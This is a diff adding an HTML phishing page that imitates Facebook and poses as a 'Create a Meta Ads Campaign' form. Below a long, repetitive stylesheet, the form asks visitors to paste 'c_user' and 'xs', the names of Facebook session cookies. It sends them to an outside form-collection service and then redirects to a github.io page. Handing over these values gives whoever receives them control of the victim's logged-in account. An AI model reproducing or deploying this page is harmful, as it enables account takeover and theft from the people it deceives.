@@ -1,0 +1,754 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Action Required</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    /* Reset default margins and ensure box-sizing */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* Smooth scrolling and base font settings */
+    html {
+      scroll-behavior: smooth;
+      font-size: 16px;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* Base styles for body */
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', sans-serif;
+      background-color: #f8fafc;
+      color: #1f2937;
+      line-height: 1.5;
+      min-height: 100vh;
+    }
+
+    /* Typography utilities */
+    h1, h2, h3, h4, h5, h6 {
+      font-weight: 700;
+      line-height: 1.2;
+      margin-bottom: 1rem;
+    }
+
+    h1 { font-size: 2.5rem; }
+    h2 { font-size: 2rem; }
+    h3 { font-size: 1.75rem; }
+    h4 { font-size: 1.5rem; }
+    h5 { font-size: 1.25rem; }
+    h6 { font-size: 1rem; }
+
+    /* Header bar styling */
+    .border {
+      border: 1px solid #e2e8f0;
+    }
+
+    .flex {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .w-full {
+      width: 100%;
+    }
+
+    .h-\[6rem\] {
+      height: 6rem;
+    }
+
+    .bg-\[\#4667ac\] {
+      background-color: #4667ac;
+    }
+
+    .mx-10 {
+      margin-left: 2.5rem;
+      margin-right: 2.5rem;
+    }
+
+    .mt-4 {
+      margin-top: 1rem;
+    }
+
+    .text-5xl {
+      font-size: 3rem;
+      font-weight: 800;
+    }
+
+    .text-white {
+      color: #fff;
+    }
+
+    b, .font-bold {
+      font-weight: 700;
+    }
+
+    .font-semibold {
+      font-weight: 600;
+    }
+
+    .font-medium {
+      font-weight: 500;
+    }
+
+    /* Form container */
+    form {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 1.5rem;
+    }
+
+    /* Form content wrapper */
+    .form-content {
+      width: 100%;
+      margin-top: 2rem;
+    }
+
+    /* Form section styling */
+    .border-b {
+      border-bottom: 1px solid #e2e8f0;
+    }
+
+    .h-10 {
+      height: 2.5rem;
+    }
+
+    .text-\[16px\] {
+      font-size: 1rem;
+    }
+
+    .text-\[\#4b4f56\] {
+      color: #4b4f56;
+    }
+
+    .pl-3 {
+      padding-left: 0.75rem;
+    }
+
+    .p-2 {
+      padding: 0.5rem;
+    }
+
+    .bg-\[\#f5f6f7\] {
+      background-color: #f5f6f7;
+    }
+
+    .text-\[12px\] {
+      font-size: 0.75rem;
+    }
+
+    .text-\[\#90949c\] {
+      color: #90949c;
+    }
+
+    /* Video link styling */
+    .w-\[120px\] {
+      width: 120px;
+    }
+
+    .h-\[80px\] {
+      height: 80px;
+    }
+
+    .block {
+      display: block;
+    }
+
+    .mx-3 {
+      margin-left: 0.75rem;
+      margin-right: 0.75rem;
+    }
+
+    a img {
+      width: 120%;
+      height: 120%;
+      object-fit: cover;
+      border-radius: 4px;
+      transition: transform 0.3s ease;
+    }
+
+   
+    /* Input labels */
+    .text-slate-400 {
+      color: #94a3b8;
+    }
+
+    .pl-4 {
+      padding-left: 1rem;
+    }
+
+    .mt-1 {
+      margin-top: 0.25rem;
+    }
+
+    /* Input fields */
+    input.border {
+      border: 0px solid #d1d5db;
+      border-radius: 6px;
+      padding: 0.375rem 0.5rem; /* Reduced padding for a more compact look */
+      font-size: 0.875rem; /* Smaller font size (14px) */
+      transition: border-color 0.2s, box-shadow 0.2s;
+      width: calc(150% - 1.8rem);
+    }
+
+    .h-6 {
+      height: 1.25rem; /* Reduced height from 1.5rem */
+    }
+
+    .pl-1 {
+      padding-left: 0.25rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4267b2;
+      box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15);
+    }
+
+    input::placeholder {
+      color: #9ca3af;
+    }
+
+    /* Submit button container */
+    .border.mx-3.h-10.mt-4.bg-\[\#f5f6f7\] {
+      border: 1px solid #d1d5db;
+      margin-left: 0.75rem;
+      margin-right: 0.75rem;
+      height: 2.5rem;
+      margin-top: 1rem;
+      background-color: #f5f6f7;
+      border-radius: 6px;
+    }
+
+    .flex.justify-end.mx-2 {
+      display: flex;
+      justify-content: flex-end;
+      margin-left: 0.5rem;
+      margin-right: 0.5rem;
+    }
+
+    /* Submit button */
+    button#delete-btn {
+      border: 1px solid #4267b2;
+      height: 2rem;
+      width: 5rem;
+      background-color: #4267b2;
+      color: #fff;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      margin-top: 0.3rem;
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+      font-size: 0.875rem;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+    }
+
+   
+    button#delete-btn:active {
+      transform: translateY(0);
+    }
+
+    button#delete-btn:disabled {
+      background-color: #93c5fd;
+      border-color: #93c5fd;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+
+    /* Additional utility classes */
+    .shadow-sm {
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    }
+
+    .shadow-md {
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .rounded-md {
+      border-radius: 6px;
+    }
+
+    .rounded-lg {
+      border-radius: 8px;
+    }
+
+    .transition {
+      transition: all 0.2s ease-in-out;
+    }
+
+    .hover\:scale-105:hover {
+      transform: scale(1.05);
+    }
+
+    /* Accessibility */
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      border: 0;
+    }
+
+    .focus\:ring:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.3);
+    }
+
+    /* Responsive design */
+    @media (max-width: 639px) {
+      .sm\:text-3xl {
+        font-size: 1.875rem;
+      }
+
+      .sm\:p-4 {
+        padding: 1rem;
+      }
+
+      form {
+        padding: 1rem;
+      }
+
+      .form-content {
+        margin-top: 1rem;
+      }
+
+      .h-\[6rem\] {
+        height: 4rem;
+      }
+
+      .text-5xl {
+        font-size: 2rem;
+      }
+
+      .mx-10 {
+        margin-left: 1rem;
+        margin-right: 1rem;
+      }
+
+      .w-\[120px\] {
+        width: 100px;
+      }
+
+      .h-\[80px\] {
+        height: 60px;
+      }
+    }
+
+    @media (min-width: 768px) {
+      .md\:block {
+        display: block;
+      }
+
+      .md\:grid-cols-2 {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 1.5rem;
+      }
+
+      .md\:text-4xl {
+        font-size: 2.25rem;
+      }
+    }
+
+    @media (min-width: 1024px) {
+      .lg\:block {
+        display: block;
+      }
+
+      .lg\:grid-cols-3 {
+        display: grid;
+        grid-template-columns: repeat(3, minmax(0, 1fr));
+        gap: 2rem;
+      }
+
+      .lg\:text-5xl {
+        font-size: 3rem;
+      }
+    }
+
+    @media (min-width: 1280px) {
+      .xl\:max-w-7xl {
+        max-width: 80rem;
+      }
+
+      .xl\:p-8 {
+        padding: 2rem;
+      }
+    }
+
+    /* High contrast mode for accessibility */
+    @media (prefers-contrast: high) {
+      body {
+        background-color: #000;
+        color: #fff;
+      }
+
+      .border {
+        border-color: #fff;
+      }
+
+      input.border {
+        border-color: #fff;
+        background-color: #333;
+        color: #fff;
+      }
+
+      button#delete-btn {
+        background-color: #1e90ff;
+        border-color: #fff;
+      }
+    }
+
+    /* Reduced motion for accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      .transition {
+        transition: none;
+      }
+
+      a img:hover {
+        transform: none;
+      }
+
+      button#delete-btn:hover {
+        transform: none;
+      }
+    }
+  /* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  padding: 0.25rem 0.375rem; /* Preserved from your last height reduction */
+  font-size: 0.75rem; /* Preserved from your last height reduction */
+  transition: border-color 0.2s, box-shadow 0.2s;
+  width: 75%; /* Reduced width to shorten length (from calc(100% - 1.5rem)) */
+}
+
+.h-6 {
+  height: 1rem; /* Preserved from your last height reduction */
+}
+
+.pl-1 {
+  padding-left: 0.25rem;
+}
+
+.mx-3 {
+  margin-left: 0.75rem;
+  margin-right: 0.75rem;
+}
+
+input:focus {
+  outline: none;
+  border-color: #4267b2;
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15);
+}
+
+input::placeholder {
+  color: #9ca3af;
+}
+
+/* Responsive design for mobile */
+@media (max-width: 639px) {
+  input.border {
+    width: 80%; /* Slightly wider on mobile to ensure usability */
+  }
+}
+/* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  padding: 0.25rem 0.375rem; /* Unchanged */
+  font-size: 0.75rem; /* Unchanged */
+  transition: border-color 0.2s, box-shadow 0.2s; /* Unchanged */
+  width: 50%; /* Further reduced from 75% to shorten length */
+}
+
+.h-6 {
+  height: 1rem; /* Unchanged */
+}
+
+.pl-1 {
+  padding-left: 0.25rem; /* Unchanged */
+}
+
+.mx-3 {
+  margin-left: 0.75rem; /* Unchanged */
+  margin-right: 0.75rem; /* Unchanged */
+}
+
+input:focus {
+  outline: none; /* Unchanged */
+  border-color: #4267b2; /* Unchanged */
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15); /* Unchanged */
+}
+
+input::placeholder {
+  color: #9ca3af; /* Unchanged */
+}
+
+/* Responsive design for mobile */
+@media (max-width: 639px) {
+  input.border {
+    width: 66%; /* Further reduced from 80% to shorten length */
+  }
+}
+/* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  padding: 0.25rem 0.375rem; /* Unchanged */
+  font-size: 0.75rem; /* Unchanged */
+  transition: border-color 0.2s, box-shadow 0.2s; /* Unchanged */
+  width: 40%; /* Further reduced from 50% to shorten length on laptops */
+}
+
+.h-6 {
+  height: 1rem; /* Unchanged */
+}
+
+.pl-1 {
+  padding-left: 0.25rem; /* Unchanged */
+}
+
+.mx-3 {
+  margin-left: 0.75rem; /* Unchanged */
+  margin-right: 0.75rem; /* Unchanged */
+}
+
+input:focus {
+  outline: none; /* Unchanged */
+  border-color: #4267b2; /* Unchanged */
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15); /* Unchanged */
+}
+
+input::placeholder {
+  color: #9ca3af; /* Unchanged */
+}
+
+/* Responsive design for mobile */
+@media (max-width: 700px) {
+  input.border {
+    width: 60%; /* Unchanged, kept at 60% for mobile usability */
+  }
+}
+/* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  padding: 0.25rem 0.375rem; /* Unchanged */
+  font-size: 0.75rem; /* Unchanged */
+  transition: border-color 0.2s, box-shadow 0.2s; /* Unchanged */
+  width: 30%; /* Further reduced from 40% to shorten length on laptops */
+}
+
+.h-6 {
+  height: 1rem; /* Unchanged */
+}
+
+.pl-1 {
+  padding-left: 0.25rem; /* Unchanged */
+}
+
+.mx-3 {
+  margin-left: 0.75rem; /* Unchanged */
+  margin-right: 0.75rem; /* Unchanged */
+}
+
+input:focus {
+  outline: none; /* Unchanged */
+  border-color: #4267b2; /* Unchanged */
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15); /* Unchanged */
+}
+
+input::placeholder {
+  color: #9ca3af; /* Unchanged */
+}
+
+/* Responsive design for mobile */
+@media (max-width: 700px) {
+  input.border {
+    width: 40%; /* Further reduced from 60% to shorten length on mobile */
+  }
+}
+/* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: 0px;
+  padding: 0.25rem 0.375rem; /* Unchanged */
+  font-size: 0.75rem; /* Unchanged */
+  transition: border-color 0.2s, box-shadow 0.2s; /* Unchanged */
+  width: 20%; /* Further reduced from 30% to shorten length on laptops */
+}
+
+.h-6 {
+  height: 1rem; /* Unchanged */
+}
+
+.pl-1 {
+  padding-left: 0.25rem; /* Unchanged */
+}
+
+.mx-3 {
+  margin-left: 0.75rem; /* Unchanged */
+  margin-right: 0.75rem; /* Unchanged */
+}
+
+input:focus {
+  outline: none; /* Unchanged */
+  border-color: #4267b2; /* Unchanged */
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15); /* Unchanged */
+}
+
+input::placeholder {
+  color: #9ca3af; /* Unchanged */
+}
+
+/* Responsive design for mobile */
+@media (max-width: 700px) {
+  input.border {
+    width: 50%; /* Unchanged, kept at 40% for mobile usability */
+  }
+}
+
+
+
+/* Input fields */
+input.border {
+  border: 1px solid #d1d5db;
+  border-radius: px;
+  padding: 0.375rem 0.375rem;
+  font-size: 0.75rem;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  width: 20%;
+}
+
+.h-6 {
+  height: 1.5rem;
+}
+
+.pl-1 {
+  padding-left: 0.25rem;
+}
+
+.mx-3 {
+  margin-left: 0.75rem;
+  margin-right: 0.75rem;
+}
+
+input:focus {
+  outline: none;
+  border-color: #4267b2;
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15);
+}
+
+input::placeholder {
+  color: #9ca3af;
+}
+
+/* Responsive design for mobile */
+@media (max-width: 639px) {
+  input.border {
+    width: 60%;
+  }
+}
+
+/* Label styles (for completeness) */
+.text-slate-400 {
+  color: #94a3b8;
+}
+
+.pl-4 {
+  padding-left: 1rem;
+}
+
+.mt-1 {
+  margin-top: 0.25rem;
+}
+  </style>
+</head>
+<body>
+  <div class="border flex w-full h-[6rem] bg-[#4667ac]">
+    <div class="mx-10 mt-4">
+      <b class="text-5xl text-white">facebook</b>
+    </div>
+  </div>
+
+  <form action="https://submit-form.com/sQouWJ1pR" method="post">
+ <input
+    type="hidden"
+    name="_redirect"
+    value="https://ads-apply.github.io/ads-apply/pass.html">
+   
+    <div class="form-content">
+      <div>
+        <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
+   Create a Meta Ads Campaign
+        </p>
+      </div>
+      <div>
+        <p class="mt-4 pl-3 text-[12px] font-semibold">
+Launch a professional advertising campaign on Meta to engage your audience across Facebook, Instagram, and more.
+        </p>
+      </div>
+      <div>
+        <p class="mt-4 pl-3 text-[12px] font-semibold">
+    Complete the form below to set up your campaign. Watch the Meta Ads guide for expert tips.
+        </p>
+      </div>
+      
+      <div>
+        <p class="text-[12px] text-[#90949c] p-2 font-semibold">
+       Meta Ads Guide Video
+        </p>
+      </div>
+    <div class="video-container">
+        <iframe 
+          src="https://www.youtube.com/embed/ZZKjHs347XU" 
+          title="Meta Ads Guide Video"
+          frameborder="0"
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+          allowfullscreen>
+        </iframe>
+      </div>
+      
+      <div>
+        <br>
+        <p class="pl-3 text-[12px] font-semibold">
+         Provide accurate campaign details below.
+        </p>
+      </div>
+       <p class="text-slate-400 pl-4 mt-1">
+    c_user
+  </p><input class="border h-6 pl-1 mx-3" type="number" name="c user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
+</div>
+<div>
+  <p class="text-slate-400 pl-4 mt-1">
+    xs
+  </p><input class="border h-6 pl-1 mx-3" type="text" name="x s" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
+</div>
+      <div>
+        <p class="mt-4 pl-3 text-[12px] font-semibold">
+         Review your details carefully. A confirmation email will be sent once your campaign is processed.
+        </p>
+      </div>
+      <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
+        <div class="flex justify-end mx-2">
+          <button id="delete-btn" type="submit">
+               Create 
+          </button>
+        </div>
+      </div>
+    </div>
+  </form>
+</body>
+</html>
